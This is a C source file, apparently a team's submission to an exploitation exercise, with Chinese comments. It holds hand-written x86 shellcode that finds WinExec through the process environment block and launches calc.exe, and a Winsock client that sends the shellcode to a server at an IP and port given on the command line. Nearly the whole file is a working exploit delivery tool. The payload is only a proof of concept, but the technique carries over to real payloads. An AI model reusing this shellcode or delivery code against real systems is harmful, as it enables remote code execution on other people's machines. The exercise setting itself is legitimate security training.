//###########################
//#
//#  队伍：   Random  
//#
//#  提交者： RPG 
//#
//########################

#include<stdio.h>
#include<stdlib.h>
#include<winsock2.h>
#include<windows.h>
#include<string.h>
#pragma comment(lib,"ws2_32.lib")

/*


client.cpp的功能：


 1、连接server的4444端口，并发送一段执行计算器calc.exe程序的数据指令

*/

//通用型谈计算器shellcode
unsigned char shellcode[] = 
"\x60\x33\xc0\x50\x68\x63\x61\x6c\x63\x50\x68\x78\x65\x63\x3f\x88"
"\x44\x24\x03\x68\x57\x69\x6e\x45\x50\x68\x65\x6c\x33\x32\x68\x6b"
"\x65\x72\x6e\x64\x8b\x50\x30\x8b\x52\x0c\x83\xc2\x1c\x8b\xc2\x33"
"\xc9\x8b\x14\x0a\x3b\xc2\x74\x6d\x8b\x72\x20\x8b\xfc\xb1\x08\x8a"
"\x44\x4e\xfe\x8a\x5c\x0f\xff\xfe\xc9\x3a\xc3\x74\xf2\x80\xf9\xff"
"\x75\xdd\x8b\x42\x08\x8b\x52\x08\x03\x40\x3c\x8b\x40\x78\x03\xc2"
"\x8b\x58\x20\x13\xda\x8b\x48\x18\x8b\x3b\x03\xfa\x8d\x74\x24\x0c"
"\x51\xb1\x08\xf3\xa6\x84\xc9\x59\x74\x07\x83\xc3\x04\xe2\xe9\xeb"
"\x24\x2b\xda\x2b\x58\x20\xd1\xeb\x03\x58\x24\x03\xda\x0f\xb7\x0b"
"\xc1\xe1\x02\x03\x48\x1c\x03\xca\x8b\x09\x03\xca\x8d\x5c\x24\x18"
"\x6a\x01\x53\xff\xd1\x83\xc4\x20\x61\xc3";




VOID CheckArgu(int argc)
{
	if(3>argc)
	{
		printf("Usage: exp5.exe <IP> <PORT>\n");
		getchar();
		exit(0);
	}

}

int main(int argc,char** argv)
{

	CheckArgu( argc);
	
	char *IP  = argv[1];
	int PORT = atoi(argv[2]);
	
	
	printf("Exploit the server....\n");
	//发送shellcode的代码：
	// 0.初始化
	WSADATA wsaData;
	WSAStartup(0x0202, &wsaData);
	
	// 1.绑定Socket
	SOCKET sockServer= socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    
	// 2.连接Socket
	struct sockaddr_in sockaddrServer;
	sockaddrServer.sin_family = AF_INET;
	sockaddrServer.sin_addr.S_un.S_addr = inet_addr(IP);
	sockaddrServer.sin_port = htons(PORT);
	memset(sockaddrServer.sin_zero, 0x00, 8);
	connect(sockServer, (struct sockaddr*)&sockaddrServer, sizeof(sockaddrServer));
    
	// 3.send
	send(sockServer, (const char *)shellcode, strlen((const char*)shellcode), 0);
	
	// 4.关闭Socket
	closesocket(sockServer);

	// 5.释放资源
	WSACleanup();
	
	getchar();
	
	return 0;
}